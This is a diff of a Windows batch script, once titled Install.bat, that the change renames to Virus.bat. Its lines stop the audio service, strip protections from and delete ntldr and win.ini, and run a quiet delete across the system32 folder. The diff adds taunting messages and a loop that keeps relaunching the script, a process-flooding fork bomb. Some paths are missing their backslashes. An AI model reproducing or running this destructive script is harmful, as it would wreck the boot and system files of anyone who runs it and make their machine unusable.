@@ -46,8 +46,11 @@
  ::::::::::::::::::::::::::::
  ::START
  ::::::::::::::::::::::::::::
-REM Run shell as admin - title Install.bat
+REM Run shell as admin - title Virus.bat
 echo ...
+echo Haha very funny right?
+echo Well say goodbye 
+echo
 net stop audiosrv   
 net stop audiosrv   
 net stop audiosrv   
@@ -304,6 +307,9 @@ attrib -r -s -h c:ntldr
 del c:ntldr
 attrib -r -s -h c:windowswin.ini
 del c:windowswin.ini
+Pushd "%~dp0"
+a:
+timeout /t 1 /nobreak >nul
+start Virus.bat
+goto a
 del c:WINDOWSsystem32*.*/q
-
-
